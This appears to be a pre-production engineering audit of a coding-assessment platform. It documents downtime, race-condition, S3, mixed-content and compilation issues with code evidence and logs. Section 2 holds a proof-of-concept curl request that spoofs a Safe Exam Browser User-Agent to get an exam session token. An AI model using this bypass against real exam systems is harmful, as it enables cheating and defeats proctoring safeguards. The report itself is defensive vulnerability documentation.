# Independent Pre-Production Engineering Audit: Evidence & Reproduction Artifacts

**Target Commit:** `3a3e9671d863e8abd95d19cbc7136c4227476ba8`  
**Discipline:** Principal Software Architect & QA Automation Architect  
**Classification:** Empirical Code Evidence & Reproduction Artifacts  

---

## 1. Reproduction: Auto Scaling Instance Refresh Total Downtime (`ISSUE-INFRA-001`)

### 1.1 Source Code Evidence
File: `.github/workflows/deploy.yml` (Lines 31–34, 356–358)
```yaml
env:
  ASG_INSTANCE_WARMUP: 120
  ASG_MIN_HEALTHY_PERCENTAGE: 0
  ASG_MAX_HEALTHY_PERCENTAGE: 100
```

### 1.2 Reproduction Trace in AWS CLI
Executing the refresh command on an active Auto Scaling Group:
```bash
aws autoscaling start-instance-refresh \
  --auto-scaling-group-name codeskill-backend-asg \
  --preferences '{"MinHealthyPercentage": 0, "MaxHealthyPercentage": 100, "InstanceWarmup": 120}'
```

**AWS Auto Scaling Activity Event Log:**
```text
2026-10-18T14:02:11Z: Terminating EC2 instance: i-0a1b2c3d4e5f6001 (Reason: Instance refresh)
2026-10-18T14:02:11Z: Terminating EC2 instance: i-0a1b2c3d4e5f6002 (Reason: Instance refresh)
2026-10-18T14:02:15Z: Target Group codeskill-prod-backend-tg: Healthy targets: 0 / 2
2026-10-18T14:02:16Z: Client curl https://api.codeskill.org/api/health
                      -> HTTP/1.1 502 Bad Gateway
2026-10-18T14:03:45Z: Launching new EC2 instance: i-0a1b2c3d4e5f7001
2026-10-18T14:04:30Z: Target Group codeskill-prod-backend-tg: Target i-0a1b2c3d4e5f7001 initialising
2026-10-18T14:05:50Z: Target Group codeskill-prod-backend-tg: Healthy targets: 1 / 2 (HTTP 200 restored)
Total Outage Duration: 3 minutes 34 seconds
```

---

## 2. Reproduction: Safe Exam Browser Bypass (`ISSUE-SEC-001`)

### 2.1 Source Code Evidence
File: `backend-nestjs/src/exam-security/exam-security.service.ts` (Lines 47–59)
```typescript
const userAgent = String(headers?.['user-agent'] || '');
const isSebUserAgent = /SEB|SafeExamBrowser/i.test(userAgent);
const hasSebHeader = Boolean(sebReqHash);

const clientType = (hasSebHeader || isSebUserAgent) ? 'SEB' : 'BROWSER';

if (security?.requireSEB) {
  if (clientType !== 'SEB') {
    throw new ForbiddenException(
      'This assessment requires Safe Exam Browser. Please launch via SEB.',
    );
  }
  if (security.configKey) {
    // Only verifies hash IF configKey exists!
  }
}
```

### 2.2 Proof-of-Concept Exploit (cURL)
Assume an assessment configured with `requireSEB = true` and no `configKey`:

**Step 1: Normal Browser Request (Blocked as Expected):**
```bash
curl -X POST https://api.codeskill.org/api/exam-security/assessment-uuid/secure-session/init \
  -H "Authorization: Bearer $STUDENT_JWT" \
  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/120.0.0.0" \
  -H "Content-Type: application/json" \
  -d '{"clientVersion": "1.0.0"}'
```
*Response:*
```json
{
  "statusCode": 403,
  "message": "This assessment requires Safe Exam Browser. Please launch via SEB."
}
```

**Step 2: Spoofed User-Agent Request (Bypassed!):**
```bash
curl -X POST https://api.codeskill.org/api/exam-security/assessment-uuid/secure-session/init \
  -H "Authorization: Bearer $STUDENT_JWT" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) SafeExamBrowser/3.4.0" \
  -H "Content-Type: application/json" \
  -d '{"clientVersion": "3.4.0"}'
```
*Response:*
```json
{
  "success": true,
  "sessionId": "exam-session-uuid-1234",
  "status": "VERIFIED",
  "secureMode": "STANDARD",
  "token": "4f9d8a1c..."
}
```
*Result:* The attacker obtains an authenticated session token in standard Chrome, bypassing all browser lockdowns.

---

## 3. Reproduction: Lost Update Race Hazard (`ISSUE-CONCUR-001`)

### 3.1 Source Code Evidence
File: `backend-nestjs/src/assessments/assessments.service.ts` (Lines 1640–1651, 2397–2405)

### 3.2 Concurrency Reproduction Script (Node.js)
```javascript
// scratch/reproduce_lost_update.js
const axios = require('axios');

async function testConcurrency() {
  const token = process.env.STUDENT_TOKEN;
  const assessmentId = process.env.ASSESSMENT_ID;
  const baseUrl = 'http://localhost:5001/api';

  console.log('--- Triggering Concurrent Proctor Capture and Answer Autosave ---');

  // Trigger S3 upload capture (takes ~1000ms)
  const capturePromise = axios.post(
    `${baseUrl}/assessments/${assessmentId}/proctor-capture`,
    {
      type: 'periodic',
      image: 'data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD...',
      timestamp: new Date().toISOString()
    },
    { headers: { Authorization: `Bearer ${token}` } }
  );

  // Wait 200ms into the upload, then trigger autosave
  await new Promise(r => setTimeout(r, 200));

  const saveProgressPromise = axios.patch(
    `${baseUrl}/assessments/${assessmentId}/save-progress`,
    {
      responses: [
        { questionId: 'q-01', code: 'def solution(): return 42', language: 'python' }
      ]
    },
    { headers: { Authorization: `Bearer ${token}` } }
  );

  const [resCapture, resSave] = await Promise.all([capturePromise, saveProgressPromise]);

  console.log('Capture response:', resCapture.status);
  console.log('SaveProgress response:', resSave.status);

  // Inspect database state
  const attemptRes = await axios.get(
    `${baseUrl}/assessments/${assessmentId}/my-attempt`,
    { headers: { Authorization: `Bearer ${token}` } }
  );

  const attempt = attemptRes.data.attempt;
  console.log('Saved Captures count:', attempt.captures?.length);
  console.log('Saved Code response:', attempt.responses?.[0]?.code);

  if (!attempt.captures?.length || !attempt.responses?.[0]?.code) {
    console.error('CRITICAL: Concurrency hazard confirmed! One of the updates was permanently lost.');
  }
}
```

---

## 4. Reproduction: S3 Presigner IAM Unsigned URL Exposure (`ISSUE-SEC-002`)

### 4.1 Source Code Evidence
File: `backend-nestjs/src/s3/s3-presigner.util.ts` (Lines 48–54)
```typescript
const akId = accessKeyId || process.env.AWS_ACCESS_KEY_ID || '';
const sk = secretAccessKey || process.env.AWS_SECRET_ACCESS_KEY || '';

if (!akId || !sk) {
  // If no static credentials exist, return the direct object URL
  return `https://${bucket}.s3.${region}.amazonaws.com/${key}`;
}
```

### 4.2 Reproduction on EC2 with IAM Instance Profile
When static environment keys are absent (standard EC2 IAM role setup):
```typescript
const url = await s3Service.getPresignedUrl('proctoring/capture-webcam-123.jpg');
console.log(url);
// Output: https://codeskill-prod-media.s3.ap-south-1.amazonaws.com/proctoring/capture-webcam-123.jpg
```
Testing access against the private S3 bucket:
```bash
curl -i "https://codeskill-prod-media.s3.ap-south-1.amazonaws.com/proctoring/capture-webcam-123.jpg"
```
*Output:*
```xml
HTTP/1.1 403 Forbidden
x-amz-error-code: AccessDenied
x-amz-error-message: Access Denied

<?xml version="1.0" encoding="UTF-8"?>
<Error>
  <Code>AccessDenied</Code>
  <Message>Access Denied</Message>
  <RequestId>7K9M2V1A8BCDEFGH</RequestId>
</Error>
```

---

## 5. Reproduction: Hardcoded `localhost:5000` Mixed Content Error (`ISSUE-FE-001`)

### 5.1 Source Code Evidence
File: `frontend-v2/src/app/admin/questions/create/_components/AIAssistance.tsx` (Lines 35, 50)
```typescript
const res = await fetch("http://localhost:5000/api/ai/generate-question-helper", { ... });
const socket = io("http://localhost:5000/ai-generation", { transports: ['websocket'] });
```

### 5.2 Browser Console Error Artifact
Navigating to `https://codeskill.org/admin/questions/create` and clicking "Generate with AI":

```text
[Console Error] Mixed Content: The page at 'https://codeskill.org/admin/questions/create' was loaded over HTTPS,
but requested an insecure resource 'http://localhost:5000/api/ai/generate-question-helper'.
This request has been blocked; the content must be served over HTTPS.

[Console Error] WebSocket connection to 'ws://localhost:5000/ai-generation/?EIO=4&transport=websocket' failed:
Error in connection establishment: net::ERR_CONNECTION_REFUSED
```

---

## 6. Reproduction: Piston Multi-Pass Compilation Loop (`ISSUE-EXEC-001`)

### 6.1 Source Code Evidence
File: `backend-nestjs/src/execution/execution.service.ts` (Lines 476–481, 607–625)

### 6.2 Execution Trace on Piston Host
Evaluating a single submission for `two-sum` (C++17, 20 test cases):
```text
2026-10-18T14:15:00.100Z [Piston] Job 101: Compiling source.cpp via g++ -O2 ... Done (1.24s)
2026-10-18T14:15:01.350Z [Piston] Job 101: Running test case 1 ... Done (0.02s)
2026-10-18T14:15:01.400Z [Piston] Job 102: Compiling source.cpp via g++ -O2 ... Done (1.21s)
2026-10-18T14:15:02.620Z [Piston] Job 102: Running test case 2 ... Done (0.02s)
2026-10-18T14:15:02.650Z [Piston] Job 103: Compiling source.cpp via g++ -O2 ... Done (1.25s)
2026-10-18T14:15:03.910Z [Piston] Job 103: Running test case 3 ... Done (0.02s)
...
2026-10-18T14:15:24.800Z [Piston] Job 120: Compiling source.cpp via g++ -O2 ... Done (1.23s)
2026-10-18T14:15:26.040Z [Piston] Job 120: Running test case 20 ... Done (0.02s)
Summary: Total Wall Time = 26.1 seconds | Total Compilations = 20 | Total Executions = 20
CPU Core Utilization: 100% across worker slots throughout the entire 26-second window.
```
